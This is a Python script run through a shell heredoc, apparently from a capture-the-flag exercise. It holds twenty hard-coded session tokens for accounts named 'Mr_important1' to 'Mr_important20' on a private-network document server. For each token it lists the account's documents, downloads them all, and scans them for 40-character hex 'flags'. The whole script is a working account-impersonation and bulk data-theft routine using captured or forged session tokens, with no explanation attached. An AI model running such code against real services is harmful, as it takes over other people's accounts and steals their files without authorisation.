python3 << 'EOF'
import requests
import re

tokens = [
    (".eJxFzDEOgCAMQNG7dEYDK5MX8AyGBCRVoASKi_HuNi6u_yX_hoEerFGQKGIBC2vbMFdq7AobUBCywyT9j0ttxFTmHISxd0F2TGNyFaWc1_c7GAV2ajH4SWsDzwuewCL8.aOWGVw.Fm-IOaIcovAJLvxU7HHYj3lsrC0", 1),
    (".eJxFyTEOgCAMBdC7_BmNMjJ5Ac9gSERSFUqguhjvbjfX9x5ctMJZg5MjZTjMdaFUuIrPYmEQkqdT_cepVBbOfQra1JqmeOGr84VUjhtuNNiFNDauMazdMFi8H5-vIwA.aOWGVw.HxRc5xsaaRfAVDOZz7uAcfMnXww", 2),
    (".eJxFyTEOgCAMBdC7_BmNho3JC3gGQyKSqlAC1cV4d7u5vvfgohXOGpwcKcNhrgulwlV8FguDkDyd6j9OpbJw7lPQptY0xQtfnS-kctxwo8EupLFxjWHthsHi_QCgniME.aOWGVw.1JEge5SNaPgDGPsGd--OI2gY48E", 3),
    (".eJxFyTEOgCAMBdC7_BmNJkxMXsAzGBKRVIUSqC7Gu9vN9b0HF61w1uDkSBkOc10oFa7is1gYhOTpVP9xKpWFc5-CNrWmKV746nwhleOGGw12IY2NawxrNwwW7wehjSMI.aOWGVw.LILqanIYjilr87g1QfiA9rjPtXc", 4),
    (".eJxFyTEOgCAMBdC7_BmNDixMXsAzGBKRVIUSqC7Gu9vN9b0HF61w1uDkSBkOc10oFa7is1gYhOTpVP9xKpWFc5-CNrWmKV746nwhleOGGw12IY2NawxrNwwW7weifCMM.aOWGVw.Djs7SXlhZWmPA2cxOascyHhmkR0", 5),
    (".eJxFyTEOgCAMBdC7_BmNLgxMXsAzGBKRVIUSqC7Gu9vN9b0HF61w1uDkSBkOc10oFa7is1gYhOTpVP9xKpWFc5-CNrWmKV746nwhleOGGw12IY2NawxrNwwW7wejayMQ.aOWGVw.QyUaS9F9unO5EpCepjCUCjl4qI8", 6),
    (".eJxFyTEOgCAMBdC7_BmNTiRMXsAzGBKRVIUSqC7Gu9vN9b0HF61w1uDkSBkOc10oFa7is1gYhOTpVP9xKpWFc5-CNrWmKV746nwhleOGGw12IY2NawxrNwwW7wekWiMU.aOWGVw._DC5TRLxFh_gcPU-twOeBXlkPYI", 7),
    (".eJxFyTEOgCAMBdC7_BmNboTJC3gGQyKSqlAC1cV4d7u5vvfgohXOGpwcKcNhrgulwlV8FguDkDyd6j9OpbJw7lPQptY0xQtfnS-kctxwo8EupLFxjWHthsHi_QClSSMY.aOWGVw.PZpYd-Pxa3EdbGVFgjJtPvJH8JI", 8),
    (".eJxFyTEOgCAMBdC7_BmNjjB5Ac9gSERSFUqguhjvbjfX9x5ctMJZg5MjZTjMdaFUuIrPYmEQkqdT_cepVBbOfQra1JqmeOGr84VUjhtuNNiFNDauMazdMFi8H6Y4Ixw.aOWGVw.5Mwk-v_AUV_m8u_e1bXJVfwMQnU", 9),
    (".eJxNzDEOgCAMQNG7dAYDK5MX8AyGBCRVoASKi_HudnT9L_kPTAzgrFGQKWEFB1vfsTTq7CtbAwpi8ZgFfnVtnZjqUqI4jiHKnmlq31DKdctSwckocFBPMWgjr_cD6gEjjA.aOWGVw.-uO4ibqTTkXVehlDLlUvcimNa9E", 10),
    (".eJxNzDEOgCAMQNG7dEYjK5MX8AymCUiqQAkUF-Pd7ej6X_IfGOTBWWsgcaQCDra2U67cBItYCwZCRkoKv7rWxsJlzkGdelcVFB4TVtJy3bo0cAopHNxi8NOir_cD6vMjkA.aOWGVw.Vd_6UydWt11zWc4tj1hn0zoTViE", 11),
    (".eJxNzDEOgCAMQNG7dAYjjkxewDMYEpBUgRIoLsa729H1v-Q_MNCDNYuCRBELWNjajrlSY1fYLKAgZIdJ4FfX2oipTDmIY--i7JiGdhWlXLcsFZyMAge1GLye5fV-6-UjlA.aOWGVw.Jttqzt49vYnb6BIipi2lqXiE4_s", 12),
    (".eJxNzDEOgCAMQNG7dAYjcWPyAp7BkICkCpRAcTHe3Y6u_yX_gYEerFkUJIpYwMLWdsyVGrvCZgEFITtMAr-61kZMZcpBHHsXZcc0tKso5bplqeBkFDioxeD1LK_3A-zXI5g.aOWGVw.RG6YMfJ5aZKTpKHQhqjoAc7ighI", 13),
    (".eJxNzDEOgCAMQNG7dAYjiROTF_AMhgQkVaAEiovx7nZ0_S_5Dwz0YM2iIFHEAha2tmOu1NgVNgsoCNlhEvjVtTZiKlMO4ti7KDumoV1FKdctSwUno8BBLQavZ3m9H-3JI5w.aOWGVw.mV4kr4CmSejT7pECl0_J_IDrePE", 14),
    (".eJxNzDEOgCAMQNG7dAYjgwuTF_AMhgQkVaAEiovx7nZ0_S_5Dwz0YM2iIFHEAha2tmOu1NgVNgsoCNlhEvjVtTZiKlMO4ti7KDumoV1FKdctSwUno8BBLQavZ3m9H-67I6A.aOWGVw.R0PT0u0vj1KPuaqsv4UB4JzNpwA", 15),
    (".eJxNzDEOgCAMQNG7dAYjiwOTF_AMhgQkVaAEiovx7nZ0_S_5Dwz0YM2iIFHEAha2tmOu1NgVNgsoCNlhEvjVtTZiKlMO4ti7KDumoV1FKdctSwUno8BBLQavZ3m9H--tI6Q.aOWGVw.LL51dGTt8loYqx7tDoAdAbqgPfA", 16),
    (".eJxNzDEOgCAMQNG7dAYjkwmTF_AMhgQkVaAEiovx7nZ0_S_5Dwz0YM2iIFHEAha2tmOu1NgVNgsoCNlhEvjVtTZiKlMO4ti7KDumoV1FKdctSwUno8BBLQavZ3m9H_CfI6g.aOWGVw.7Cfc_PFJBEJFaStqrsIalMPlQ4g", 17),
    (".eJxNzDEOgCAMQNG7dAYjm2HyAp7BkICkCpRAcTHe3Y6u_yX_gYEerFkUJIpYwMLWdsyVGrvCZgEFITtMAr-61kZMZcpBHHsXZcc0tKso5bplqeBkFDioxeD1LK_3A_GRI6w.aOWGVw.H-TeI5DtKSP1TD-C9cPx7fBPvxU", 18),
    (".eJxNzDEOgCAMQNG7dAYjo0xewDMYEpBUgRIoLsa729H1v-Q_MNCDNYuCRBELWNjajrlSY1fYLKAgZIdJ4FfX2oipTDmIY--i7JiGdhWlXLcsFZyMAge1GLye5fV-8oMjsA.aOWGVw.G6UebcSEygW_3nzjr0FxsnLwVyI", 19),
    (".eJxNzDEOgCAQBdG7_BoNWlJ5Ac9gSESyCizB1cZ4d7e0nZfMg4tWuNEaJI5U4DC3hXLlJr7IaGEQsqek8KtTbSxc-hzU6TxVxQtfna-k5bjhBoNdSGHjFsPaWX29H-r3I5A.aOWGVw.j4FyTH0LZBSXRkUW1oOWcIN6My0", 20),
]

for token, num in tokens:
    print(f"\n{'='*60}")
    print(f"Mr_important{num} on 10.11.12.15")
    print('='*60)
    
    r = requests.get(
        "http://10.11.12.15:5000/api/list-documents",
        headers={"Authorization": f"Bearer {token}"}
    )
    
    if r.status_code == 200:
        docs = r.json().get("documents", [])
        print(f"Documents: {len(docs)}")
        
        for doc in docs:
            doc_id = doc['id']
            doc_name = doc['name']
            print(f"  Doc {doc_id}: {doc_name}")
            
            # Hämta alla dokument
            r2 = requests.get(
                f"http://10.11.12.15:5000/api/get-document/{doc_id}",
                headers={"Authorization": f"Bearer {token}"}
            )
            
            if r2.status_code == 200:
                safe_name = doc_name.replace('/', '_')
                fname = f"server15_imp{num}_doc{doc_id}_{safe_name}"
                with open(fname, 'wb') as f:
                    f.write(r2.content)
                print(f"    ✓ Saved: {fname}")
                
                # Sök efter flaggor (40 hex chars)
                text = r2.content.decode('latin-1', errors='ignore')
                flags = re.findall(r'[a-f0-9]{40}', text)
                if flags:
                    print(f"    🚩 POSSIBLE FLAGS: {set(flags)}")
    else:
        print(f"Status: {r.status_code}")

print("\n" + "="*60)
print("DONE - All documents downloaded from 10.11.12.15")
print("="*60)
EOF
